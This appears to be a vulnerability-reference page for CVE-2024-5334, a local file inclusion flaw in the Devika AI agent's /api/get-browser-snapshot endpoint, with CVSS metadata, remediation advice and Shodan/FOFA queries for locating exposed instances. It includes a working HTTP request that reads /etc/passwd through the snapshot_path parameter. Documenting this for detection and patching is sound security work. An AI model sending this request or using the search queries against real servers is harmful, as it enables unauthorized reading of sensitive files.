---
layout: post
cve_id: CVE-2024-5334
title: Devika - Local File Inclusion
pcap: true
pcap_path: /pcaps/2024/CVE-2024-5334.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-5334.yaml
snort2_rule: N/A
snort3_rule: N/A
author: nechyo,nukunga,harksu,olfloralo,gy741
severity: high
impact: 'Successful exploitation could lead to unauthorized access to sensitive files
  and data.

  '
remediation: 'Ensure input validation is implemented to prevent malicious file inclusions
  and use whitelists for allowed file paths.

  '
reference:
- https://huntr.com/bounties/7eec128b-1bf5-4922-a95c-551ad3695cf6
- https://github.com/stitionai/devika/commit/6acce21fb08c3d1123ef05df6a33912bf0ee77c2
- https://nvd.nist.gov/vuln/detail/CVE-2024-5334
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 7.5
  cve-id: CVE-2024-5334
  cwe-id: CWE-73
  epss-score: 0.60416
  epss-percentile: 0.9821
metadata:
  max-request: 1
  shodan-query: title:"Devika AI"
  fofa-query: title="Devika AI"
tags:
- cve
- cve2024
- devika-ai
- lfi
- vkev
- vuln
---

## üîç Vulnerability Description
A local file read vulnerability exists in the stitionai/devika repository, affecting the latest version. The vulnerability is due to improper handling of the 'snapshot_path' parameter in the '/api/get-browser-snapshot' endpoint. An attacker can exploit this vulnerability by crafting a request with a malicious 'snapshot_path' parameter, leading to arbitrary file read from the system. This issue impacts the security of the application by allowing unauthorized access to sensitive files on the server.


## üåê HTTP Request
```nohighlight
GET /api/get-browser-snapshot?snapshot_path=/etc/passwd HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0
Connection: close
Accept-Encoding: gzip
```

